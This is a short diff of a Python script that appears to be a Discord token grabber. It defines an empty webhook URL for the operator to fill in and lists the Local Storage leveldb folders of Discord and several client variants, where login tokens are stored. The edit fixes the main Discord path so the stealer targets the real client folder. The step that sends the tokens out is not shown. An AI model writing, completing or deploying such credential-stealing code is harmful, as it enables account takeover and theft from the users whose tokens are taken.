@@ -6,7 +6,7 @@ webhook = ""  # Input Your WEBHOOK URL Here
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 paths = {
-    "Discord": f"{roaming}/PhrogCord/Local Storage/leveldb",
+    "Discord": f"{roaming}/Discord/Local Storage/leveldb",
     "Discord Canary": f"{roaming}/DiscordCanary/Local Storage/leveldb",
     "Discord PTB": f"{roaming}/DiscordPTB/Local Storage/leveldb",
     "LigthCord": f"{roaming}/Lightcord/Local Storage/leveldb",
